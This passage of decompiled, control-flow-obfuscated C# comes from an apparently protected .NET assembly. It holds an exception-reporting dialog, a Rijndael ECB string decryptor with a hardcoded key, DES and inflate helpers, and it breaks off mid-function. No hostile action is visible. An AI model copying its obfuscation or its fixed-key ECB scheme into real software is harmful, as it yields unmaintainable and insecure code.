		class34_0.int_0 = int_1 & 0x7FFF;
	}

	static void smethod_93(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static void smethod_94(string string_0, Class45 class45_0, string string_1)
	{
		while (File.Exists(string_1))
		{
			Class45.Struct20 value = new Class45.Struct20(string_1);
			while (true)
			{
				class45_0.dictionary_1.Add(string_0, value);
				int num = 5;
				if (!J5IwCwpfghTToLC3MgK())
				{
				}
				while (true)
				{
					switch (num)
					{
					default:
						num = 3;
						if (eBBp0Op7wSDKHwLe0VT())
						{
							continue;
						}
						goto end_IL_0038;
					case 3:
						break;
					case 0:
					case 2:
						goto end_IL_0038;
					case 1:
					case 4:
						return;
					case 5:
						return;
					}
					break;
				}
				continue;
				end_IL_0038:
				break;
			}
		}
	}

	static string smethod_95(string string_0)
	{
		string s = "日见妈哪明明国没";
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(s));
			Array.Copy(sourceArray, 0, array, 0, 10);
			Array.Copy(sourceArray, 0, array, 15, 10);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(string_0);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static Bitmap smethod_96(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".png");
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_97(Form0 form0_0)
	{
		//IL_0304: Unknown result type (might be due to invalid IL or missing references)
		//IL_030e: Expected O, but got Unknown
		//IL_12bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_12c9: Expected O, but got Unknown
		//IL_12ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_12d4: Expected O, but got Unknown
		//IL_12d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_12df: Expected O, but got Unknown
		//IL_12eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f5: Expected O, but got Unknown
		//IL_12f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1300: Expected O, but got Unknown
		//IL_130c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1316: Expected O, but got Unknown
		//IL_148d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1497: Expected O, but got Unknown
		//IL_14ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_14c4: Expected O, but got Unknown
		//IL_14c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_14cf: Expected O, but got Unknown
		//IL_14d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_14da: Expected O, but got Unknown
		//IL_14db: Unknown result type (might be due to invalid IL or missing references)
		//IL_14e5: Expected O, but got Unknown
		//IL_14e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_14f0: Expected O, but got Unknown
		//IL_1509: Unknown result type (might be due to invalid IL or missing references)
		//IL_1513: Expected O, but got Unknown
		//IL_1514: Unknown result type (might be due to invalid IL or missing references)
		//IL_151e: Expected O, but got Unknown
		//IL_151f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1529: Expected O, but got Unknown
		//IL_152a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1534: Expected O, but got Unknown
		//IL_1535: Unknown result type (might be due to invalid IL or missing references)
		//IL_153f: Expected O, but got Unknown
		//IL_1540: Unknown result type (might be due to invalid IL or missing references)
		//IL_154a: Expected O, but got Unknown
		//IL_1566: Unknown result type (might be due to invalid IL or missing references)
		//IL_1570: Expected O, but got Unknown
		while (true)
		{
			form0_0.panel_0 = new Panel();
			while (true)
			{
				form0_0.button_5 = new Button();
				form0_0.checkBox_0 = new CheckBox();
				form0_0.label_0 = new Label();
				form0_0.button_0 = new Button();
				form0_0.button_1 = new Button();
				form0_0.label_1 = new Label();
				form0_0.control1_0 = new Control1();
				form0_0.class53_0 = new Class53();
				while (true)
				{
					form0_0.button_7 = new Button();
					form0_0.panel_1 = new Panel();
					form0_0.button_2 = new Button();
					form0_0.button_3 = new Button();
					form0_0.button_4 = new Button();
					form0_0.control3_0 = new Control3();
					form0_0.control1_1 = new Control1();
					while (true)
					{
						form0_0.control0_0 = new Control0();
						while (true)
						{
							IL_146b:
							form0_0.control0_1 = new Control0();
							form0_0.control0_2 = new Control0();
							form0_0.control0_3 = new Control0();
							form0_0.panel_2 = new Panel();
							int num = 14;
							if (!eBBp0Op7wSDKHwLe0VT())
							{
								goto IL_0448;
							}
							goto IL_1345;
							IL_1345:
							while (true)
							{
								switch (num)
								{
								case 69:
									((Control)form0_0.button_1).set_TabIndex(9);
									((Control)form0_0.button_1).set_Text("&Send Error Report");
									((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_0);
									((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
									goto case 26;
								case 26:
									form0_0.label_1.set_FlatStyle((FlatStyle)3);
									((Control)form0_0.label_1).set_Location(new Point(20, 140));
									((Control)form0_0.label_1).set_Name("pleaseTellMessage");
									((Control)form0_0.label_1).set_Size(new Size(381, 55));
									((Control)form0_0.label_1).set_TabIndex(12);
									((Control)form0_0.label_1).set_Text("To help improve the software you use, %CompanyName% is interested in learning more about this error. We have created a report about the error for you to send to us.");
									((Control)form0_0.control1_0).set_BackColor(Color.FromArgb(36, 96, 179));
									goto case 9;
								case 9:
									((Control)form0_0.control1_0).set_Dock((DockStyle)1);
									((Control)form0_0.control1_0).set_ForeColor(Color.White);
									form0_0.control1_0.IconState = Enum5.const_1;
									form0_0.control1_0.Image = null;
									((Control)form0_0.control1_0).set_Location(new Point(0, 0));
									((Control)form0_0.control1_0).set_Name("headerControl1");
									((Control)form0_0.control1_0).set_Size(new Size(413, 58));
									((Control)form0_0.control1_0).set_TabIndex(3);
									((Control)form0_0.control1_0).set_TabStop(false);
									((Control)form0_0.control1_0).set_Text("%AppName% has encountered a problem.\nWe are sorry for the inconvenience.");
									((Control)form0_0.class53_0).set_Anchor((AnchorStyles)13);
									((Label)form0_0.class53_0).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.class53_0).set_Location(new Point(20, 69));
									((Control)form0_0.class53_0).set_Name("errorMessage");
									((Control)form0_0.class53_0).set_Size(new Size(381, 13));
									((Control)form0_0.class53_0).set_TabIndex(10);
									((Control)form0_0.class53_0).set_Text("errorMessage");
									((Label)form0_0.class53_0).set_UseMnemonic(false);
									((Control)form0_0.button_7).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_7).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_7).set_Location(new Point(136, 205));
									goto case 66;
								case 66:
									((Control)form0_0.button_7).set_Name("saveAsFile");
									((Control)form0_0.button_7).set_Size(new Size(72, 24));
									goto case 63;
								case 63:
									((Control)form0_0.button_7).set_TabIndex(11);
									num = 59;
									if (J5IwCwpfghTToLC3MgK())
									{
									}
									continue;
								case 68:
									((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
									((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
									goto case 60;
								case 60:
									((Control)form0_0.checkBox_0).set_Location(new Point(22, 99));
									((Control)form0_0.checkBox_0).set_Name("continueCheckBox");
									goto case 65;
								case 65:
									((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
									goto case 10;
								case 10:
									((Control)form0_0.checkBox_0).set_TabIndex(14);
									((Control)form0_0.checkBox_0).set_Text("Ignore this error and attempt to &continue.");
									goto case 45;
								case 45:
									form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_4);
									((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
									form0_0.label_0.set_FlatStyle((FlatStyle)3);
									goto case 15;
								case 15:
									((Control)form0_0.label_0).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
									((Control)form0_0.label_0).set_Location(new Point(20, 124));
									goto case 54;
								case 54:
									((Control)form0_0.label_0).set_Name("pleaseTellTitle");
									((Control)form0_0.label_0).set_Size(new Size(381, 16));
									((Control)form0_0.label_0).set_TabIndex(11);
									((Control)form0_0.label_0).set_Text("Please tell %CompanyName% about this problem.");
									((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_0).set_Location(new Point(325, 205));
									goto case 22;
								case 22:
									((Control)form0_0.button_0).set_Name("dontSendReport");
									goto case 17;
								case 17:
									((Control)form0_0.button_0).set_Size(new Size(75, 24));
									goto case 18;
								case 18:
									((Control)form0_0.button_0).set_TabIndex(6);
									((Control)form0_0.button_0).set_Text("&Don't Send");
									((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_1);
									((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
									goto case 31;
								case 31:
									((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_1).set_Location(new Point(214, 205));
									((Control)form0_0.button_1).set_Name("sendReport");
									num = 51;
									if (!J5IwCwpfghTToLC3MgK())
									{
										continue;
									}
									goto case 26;
								case 24:
								case 67:
									break;
								case 29:
									goto IL_0504;
								case 21:
									goto IL_0573;
								case 23:
									goto IL_0590;
								case 27:
									goto IL_060a;
								case 58:
									goto IL_0617;
								case 48:
									goto IL_064e;
								case 3:
									goto IL_065a;
								case 19:
									goto IL_06bc;
								case 25:
									goto IL_06ed;
								case 61:
									goto IL_0715;
								case 1:
									goto IL_0737;
								case 50:
									goto IL_0747;
								case 42:
									goto IL_076f;
								case 39:
									goto IL_0783;
								case 0:
									goto IL_07ab;
								case 5:
									goto IL_0860;
								case 47:
								case 55:
									goto IL_0879;
								case 64:
									goto IL_0985;
								case 62:
									((Control)form0_0.control1_1).set_Name("headerControl2");
									((Control)form0_0.control1_1).set_Size(new Size(413, 58));
									goto IL_0860;
								case 59:
									((Control)form0_0.button_7).set_Text("Save as &File");
									((Control)form0_0.button_7).add_Click((EventHandler)form0_0.method_15);
									num = 43;
									if (eBBp0Op7wSDKHwLe0VT())
									{
										continue;
									}
									goto case 60;
								case 57:
									((Control)form0_0.panel_2).set_TabIndex(4);
									((Control)form0_0.panel_2).set_Visible(false);
									form0_0.label_3.set_FlatStyle((FlatStyle)3);
									((Control)form0_0.label_3).set_Location(new Point(20, 131));
									((Control)form0_0.label_3).set_Name("labelEmail");
									((Control)form0_0.label_3).set_Size(new Size(100, 16));
									((Control)form0_0.label_3).set_TabIndex(9);
									((Control)form0_0.label_3).set_Text("&Email address:");
									((ButtonBase)form0_0.checkBox_1).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.checkBox_1).set_Location(new Point(120, 160));
									((Control)form0_0.checkBox_1).set_Name("sendAnonymously");
									((Control)form0_0.checkBox_1).set_Size(new Size(232, 16));
									goto case 52;
								case 52:
									((Control)form0_0.checkBox_1).set_TabIndex(11);
									((Control)form0_0.checkBox_1).set_Text("I prefer to send this report &anonymously.");
									form0_0.checkBox_1.add_CheckedChanged((EventHandler)form0_0.method_14);
									((Control)form0_0.textBox_0).set_Location(new Point(120, 128));
									((Control)form0_0.textBox_0).set_Name("email");
									((Control)form0_0.textBox_0).set_Size(new Size(256, 20));
									((Control)form0_0.textBox_0).set_TabIndex(10);
									goto case 41;
								case 41:
									((Control)form0_0.textBox_0).add_TextChanged((EventHandler)form0_0.method_13);
									((Control)form0_0.control1_2).set_BackColor(Color.FromArgb(36, 96, 179));
									((Control)form0_0.control1_2).set_Dock((DockStyle)1);
									((Control)form0_0.control1_2).set_ForeColor(Color.White);
									form0_0.control1_2.IconState = Enum5.const_1;
									form0_0.control1_2.Image = null;
									goto case 56;
								case 56:
									((Control)form0_0.control1_2).set_Location(new Point(0, 0));
									((Control)form0_0.control1_2).set_Name("headerControl3");
									((Control)form0_0.control1_2).set_Size(new Size(413, 58));
									((Control)form0_0.control1_2).set_TabIndex(3);
									((Control)form0_0.control1_2).set_TabStop(false);
									((Control)form0_0.control1_2).set_Text("Do you want to be contacted by %CompanyName% regarding this problem?");
									((Control)form0_0.label_2).set_Anchor((AnchorStyles)13);
									form0_0.label_2.set_FlatStyle((FlatStyle)3);
									((Control)form0_0.label_2).set_Location(new Point(20, 69));
									((Control)form0_0.label_2).set_Name("label3");
									((Control)form0_0.label_2).set_Size(new Size(381, 43));
									((Control)form0_0.label_2).set_TabIndex(10);
									((Control)form0_0.label_2).set_Text("If you want to be contacted by %CompanyName% regarding this error, please provide your e-mail address. This information will not be used for any other purpose.");
									((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
									((Control)form0_0.button_6).set_Enabled(false);
									((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_6).set_Location(new Point(295, 197));
									((Control)form0_0.button_6).set_Name("continueSendReport");
									((Control)form0_0.button_6).set_Size(new Size(105, 24));
									((Control)form0_0.button_6).set_TabIndex(12);
									goto IL_0737;
								case 53:
									((Control)form0_0.control0_2).set_TabStop(false);
									((Control)form0_0.control0_2).set_Text("Transferring report.");
									((Control)form0_0.control0_3).set_Location(new Point(24, 144));
									((Control)form0_0.control0_3).set_Name("completedFeedback");
									((Control)form0_0.control0_3).set_Size(new Size(368, 16));
									num = 30;
									if (J5IwCwpfghTToLC3MgK())
									{
									}
									continue;
								case 51:
									((Control)form0_0.button_1).set_Size(new Size(105, 24));
									goto case 69;
								case 49:
									((Control)form0_0.button_5).set_Location(new Point(66, 205));
									num = 33;
									if (eBBp0Op7wSDKHwLe0VT())
									{
										continue;
									}
									goto IL_0617;
								case 46:
									((Form)form0_0).set_ClientSize(new Size(434, 768));
									((Form)form0_0).set_ControlBox(false);
									break;
								case 44:
									((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.control1_2);
									((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.label_2);
									((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.button_6);
									((Control)form0_0.panel_2).set_Location(new Point(11, 512));
									goto case 16;
								case 16:
									((Control)form0_0.panel_2).set_Name("panelEmail");
									((Control)form0_0.panel_2).set_Size(new Size(413, 232));
									goto case 57;
								case 43:
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_8);
									num = 38;
									if (!J5IwCwpfghTToLC3MgK())
									{
										continue;
									}
									goto IL_076f;
								case 40:
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_0);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_1);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_1);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.control1_0);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.class53_0);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_7);
									goto case 12;
								case 12:
									((Control)form0_0.panel_0).set_Location(new Point(8, 8));
									((Control)form0_0.panel_0).set_Name("panelInformation");
									((Control)form0_0.panel_0).set_Size(new Size(413, 240));
									((Control)form0_0.panel_0).set_TabIndex(0);
									((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
									goto case 49;
								case 38:
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_2);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_3);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_4);
									goto case 28;
								case 28:
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control3_0);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control1_1);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_0);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_1);
									goto case 2;
								case 2:
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_2);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_3);
									((Control)form0_0.panel_1).set_Location(new Point(8, 264));
									((Control)form0_0.panel_1).set_Name("panelSending");
									((Control)form0_0.panel_1).set_Size(new Size(413, 232));
									goto IL_0504;
								case 36:
									((Control)form0_0.control0_2).set_Size(new Size(368, 16));
									((Control)form0_0.control0_2).set_TabIndex(20);
									num = 53;
									if (eBBp0Op7wSDKHwLe0VT())
									{
										continue;
									}
									goto IL_0590;
								case 34:
									((Control)form0_0.panel_1).SuspendLayout();
									((Control)form0_0.panel_2).SuspendLayout();
									goto case 8;
								case 8:
									((Control)form0_0).SuspendLayout();
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_5);
									num = 32;
									if (eBBp0Op7wSDKHwLe0VT())
									{
										continue;
									}
									goto case 28;
								case 33:
									((Control)form0_0.button_5).set_Name("debug");
									((Control)form0_0.button_5).set_Size(new Size(64, 24));
									((Control)form0_0.button_5).set_TabIndex(13);
									((Control)form0_0.button_5).set_Text("Debug");
									((Control)form0_0.button_5).set_Visible(false);
									((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_11);
									goto case 68;
								case 32:
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.checkBox_0);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_0);
									goto case 40;
								case 30:
									((Control)form0_0.control0_3).set_TabIndex(21);
									goto IL_064e;
								case 20:
									((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_4).set_Location(new Point(144, 197));
									((Control)form0_0.button_4).set_Name("retrySending");
									((Control)form0_0.button_4).set_Size(new Size(80, 24));
									((Control)form0_0.button_4).set_TabIndex(23);
									((Control)form0_0.button_4).set_Text("&Retry");
									((Control)form0_0.button_4).set_Visible(false);
									((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_9);
									goto case 4;
								case 4:
									((Control)form0_0.control3_0).set_Location(new Point(87, 145));
									((Control)form0_0.control3_0).set_Name("waitSendingReport");
									((Control)form0_0.control3_0).set_Size(new Size(250, 42));
									((Control)form0_0.control3_0).set_TabIndex(11);
									((Control)form0_0.control3_0).set_TabStop(false);
									num = 19;
									if (eBBp0Op7wSDKHwLe0VT())
									{
										continue;
									}
									goto case 14;
								case 14:
									form0_0.label_3 = new Label();
									form0_0.checkBox_1 = new CheckBox();
									form0_0.textBox_0 = new TextBox();
									form0_0.control1_2 = new Control1();
									form0_0.label_2 = new Label();
									form0_0.button_6 = new Button();
									form0_0.control2_0 = new Control2();
									form0_0.button_8 = new Button();
									((Control)form0_0.panel_0).SuspendLayout();
									goto case 34;
								case 13:
									((Control)form0_0).set_BackColor(SystemColors.Window);
									goto case 46;
								default:
									num = 29;
									if (eBBp0Op7wSDKHwLe0VT())
									{
										continue;
									}
									return;
								case 7:
									goto IL_146b;
								case 37:
									goto end_IL_146b;
								case 6:
									goto end_IL_14ac;
								case 11:
									goto end_IL_14b9;
								case 35:
									goto end_IL_1508;
								case 70:
									return;
								}
								break;
							}
							goto IL_0448;
							IL_0448:
							((Control)form0_0).get_Controls().Add((Control)(object)form0_0.control2_0);
							((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_2);
							((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_0);
							((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_1);
							((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
							((Control)form0_0).set_Name("ExceptionReportingForm");
							((Form)form0_0).set_ShowInTaskbar(false);
							((Form)form0_0).set_StartPosition((FormStartPosition)1);
							((Control)form0_0).set_Text("%AppName%");
							((Form)form0_0).set_TopMost(true);
							((Control)form0_0.panel_0).ResumeLayout(false);
							((Control)form0_0.panel_1).ResumeLayout(false);
							((Control)form0_0.panel_2).ResumeLayout(false);
							((Control)form0_0.panel_2).PerformLayout();
							((Control)form0_0).ResumeLayout(false);
							num = 70;
							if (J5IwCwpfghTToLC3MgK())
							{
								goto IL_0504;
							}
							goto IL_1345;
							IL_0504:
							((Control)form0_0.panel_1).set_TabIndex(2);
							((Control)form0_0.panel_1).set_Visible(false);
							((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
							((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
							((Control)form0_0.button_2).set_Location(new Point(320, 197));
							((Control)form0_0.button_2).set_Name("cancelSending");
							((Control)form0_0.button_2).set_Size(new Size(80, 24));
							goto IL_0573;
							IL_0573:
							((Control)form0_0.button_2).set_TabIndex(10);
							((Control)form0_0.button_2).set_Text("&Cancel");
							goto IL_0590;
							IL_0590:
							((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_2);
							((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
							((Control)form0_0.button_3).set_Enabled(false);
							((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
							((Control)form0_0.button_3).set_Location(new Point(232, 197));
							((Control)form0_0.button_3).set_Name("ok");
							((Control)form0_0.button_3).set_Size(new Size(80, 24));
							goto IL_060a;
							IL_060a:
							((Control)form0_0.button_3).set_TabIndex(22);
							goto IL_0617;
							IL_0617:
							((Control)form0_0.button_3).set_Text("&OK");
							((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_3);
							num = 20;
							if (!eBBp0Op7wSDKHwLe0VT())
							{
								goto IL_064e;
							}
							goto IL_1345;
							IL_064e:
							((Control)form0_0.control0_3).set_TabStop(false);
							goto IL_065a;
							IL_065a:
							((Control)form0_0.control0_3).set_Text("Error reporting completed. Thank you.");
							((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.label_3);
							((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.checkBox_1);
							((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.textBox_0);
							num = 44;
							if (J5IwCwpfghTToLC3MgK())
							{
								goto IL_06bc;
							}
							goto IL_1345;
							IL_06bc:
							((Control)form0_0.control3_0).set_Visible(false);
							((Control)form0_0.control1_1).set_BackColor(Color.FromArgb(36, 96, 179));
							((Control)form0_0.control1_1).set_Dock((DockStyle)1);
							goto IL_06ed;
							IL_06ed:
							((Control)form0_0.control1_1).set_ForeColor(Color.White);
							form0_0.control1_1.IconState = Enum5.const_1;
							form0_0.control1_1.Image = null;
							goto IL_0715;
							IL_0715:
							((Control)form0_0.control1_1).set_Location(new Point(0, 0));
							num = 62;
							if (J5IwCwpfghTToLC3MgK())
							{
								goto IL_0737;
							}
							goto IL_1345;
							IL_0737:
							((Control)form0_0.button_6).set_Text("&Send Error Report");
							goto IL_0747;
							IL_0747:
							((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
							((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
							goto IL_0985;
							IL_0985:
							((Control)form0_0.control2_0).set_Cursor(Cursors.get_Hand());
							((Control)form0_0.control2_0).set_Location(new Point(6, 730));
							((Control)form0_0.control2_0).set_Name("poweredBy");
							goto IL_076f;
							IL_076f:
							((Control)form0_0.control2_0).set_Size(new Size(112, 32));
							goto IL_0783;
							IL_0783:
							((Control)form0_0.control2_0).set_TabIndex(5);
							((Control)form0_0.control2_0).set_TabStop(false);
							((Control)form0_0.control2_0).set_Text("poweredBy1");
							goto IL_07ab;
							IL_07ab:
							((Control)form0_0.button_8).set_Anchor((AnchorStyles)10);
							((ButtonBase)form0_0.button_8).set_FlatStyle((FlatStyle)3);
							((Control)form0_0.button_8).set_Location(new Point(146, 197));
							((Control)form0_0.button_8).set_Name("saveReport");
							((Control)form0_0.button_8).set_Size(new Size(80, 24));
							((Control)form0_0.button_8).set_TabIndex(25);
							((Control)form0_0.button_8).set_Text("&Save Report");
							((Control)form0_0.button_8).set_Visible(false);
							((Control)form0_0.button_8).add_Click((EventHandler)form0_0.method_16);
							((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
							num = 13;
							if (!eBBp0Op7wSDKHwLe0VT())
							{
								goto IL_0860;
							}
							goto IL_1345;
							IL_0860:
							((Control)form0_0.control1_1).set_TabIndex(24);
							((Control)form0_0.control1_1).set_TabStop(false);
							goto IL_0879;
							IL_0879:
							((Control)form0_0.control1_1).set_Text("Please wait while %AppName% is sending the report to %CompanyName% through the Internet.");
							((Control)form0_0.control0_0).set_Location(new Point(24, 72));
							((Control)form0_0.control0_0).set_Name("preparingFeedback");
							((Control)form0_0.control0_0).set_Size(new Size(368, 16));
							((Control)form0_0.control0_0).set_TabIndex(18);
							((Control)form0_0.control0_0).set_TabStop(false);
							((Control)form0_0.control0_0).set_Text("Preparing the error report.");
							((Control)form0_0.control0_1).set_Location(new Point(24, 96));
							((Control)form0_0.control0_1).set_Name("connectingFeedback");
							((Control)form0_0.control0_1).set_Size(new Size(368, 16));
							((Control)form0_0.control0_1).set_TabIndex(19);
							((Control)form0_0.control0_1).set_TabStop(false);
							((Control)form0_0.control0_1).set_Text("Connecting to server.");
							((Control)form0_0.control0_2).set_Location(new Point(24, 120));
							((Control)form0_0.control0_2).set_Name("transferingFeedback");
							num = 36;
							if (!eBBp0Op7wSDKHwLe0VT())
							{
								goto IL_0985;
							}
							goto IL_1345;
							continue;
							end_IL_146b:
							break;
						}
						continue;
						end_IL_14ac:
						break;
					}
					continue;
					end_IL_14b9:
					break;
				}
				continue;
				end_IL_1508:
				break;
			}
		}
	}

	static void smethod_98(object[] object_0, Exception exception_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class54.string_0 == "1") || !Class54.Handler.method_2((SecurityException)exception_0))
		{
			Class56.smethod_46(exception_0, object_0);
			Class54.Handler.method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static ICryptoTransform smethod_99(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	static bool smethod_100(int int_0, Class31.Class38 class38_0)
	{
		class38_0.short_0[class38_0.int_1] = 0;
		class38_0.byte_1[class38_0.int_1++] = (byte)int_0;
		class38_0.class39_0.short_0[int_0]++;
		return Class56.smethod_59(class38_0);
	}

	static bool smethod_101(Class31.Class36 class36_0, Class31.Class33 class33_0)
	{
		bool result = default(bool);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			int int_ = class36_0.int_2;
			while (true)
			{
				IL_01a9:
				switch (int_)
				{
				case 1:
					goto IL_009f;
				case 2:
					class36_0.int_5 = Class56.smethod_48(class33_0, 4);
					goto IL_0105;
				case 3:
					while (true)
					{
						int num3;
						if (class36_0.int_8 < class36_0.int_5)
						{
							num3 = Class56.smethod_48(class33_0, 3);
							while (true)
							{
								if (num3 >= 0)
								{
									Class56.smethod_71(class33_0, 3);
									int num4 = 11;
									if (!eBBp0Op7wSDKHwLe0VT())
									{
										break;
									}
									while (true)
									{
										switch (num4)
										{
										case 3:
											break;
										default:
											num4 = 5;
											if (eBBp0Op7wSDKHwLe0VT())
											{
												continue;
											}
											goto case 6;
										case 5:
											goto end_IL_003d;
										case 8:
											goto IL_0091;
										case 4:
											goto IL_009f;
										case 1:
											goto IL_0105;
										case 11:
											goto IL_0143;
										case 0:
										case 7:
											goto IL_01a9;
										case 14:
											goto end_IL_0166;
										case 13:
											goto IL_0257;
										case 2:
											goto IL_02c4;
										case 12:
											goto IL_02f7;
										case 6:
										case 9:
										case 10:
										case 15:
										case 16:
											return result;
										}
										goto end_IL_01aa;
										continue;
										end_IL_003d:
										break;
									}
									continue;
								}
								goto IL_02f7;
								IL_02f7:
								return false;
							}
							goto end_IL_01aa;
						}
						class36_0.class35_0 = new Class31.Class35(class36_0.byte_0);
						class36_0.byte_0 = null;
						class36_0.int_8 = 0;
						class36_0.int_2 = 4;
						break;
						IL_0143:
						class36_0.byte_0[Class31.Class36.int_9[class36_0.int_8]] = (byte)num3;
						class36_0.int_8++;
						continue;
						end_IL_0166:
						break;
					}
					goto case 4;
				case 0:
					class36_0.int_3 = Class56.smethod_48(class33_0, 5);
					if (class36_0.int_3 >= 0)
					{
						class36_0.int_3 += 257;
						goto IL_0091;
					}
					return false;
				case 4:
					while (((num2 = Class56.smethod_61(class36_0.class35_0, class33_0)) & -16) == 0)
					{
						class36_0.byte_1[class36_0.int_8++] = (class36_0.byte_2 = (byte)num2);
						if (class36_0.int_8 == class36_0.int_6)
						{
							return true;
						}
					}
					if (num2 >= 0)
					{
						if (num2 >= 17)
						{
							goto IL_0257;
						}
						goto IL_025e;
					}
					return false;
				case 5:
					{
						int int_2 = Class31.Class36.int_1[class36_0.int_7];
						num = Class56.smethod_48(class33_0, int_2);
						if (num >= 0)
						{
							Class56.smethod_71(class33_0, int_2);
							num += Class31.Class36.int_0[class36_0.int_7];
							goto IL_02c4;
						}
						return false;
					}
					IL_02c4:
					while (num-- > 0)
					{
						class36_0.byte_1[class36_0.int_8++] = class36_0.byte_2;
					}
					if (class36_0.int_8 != class36_0.int_6)
					{
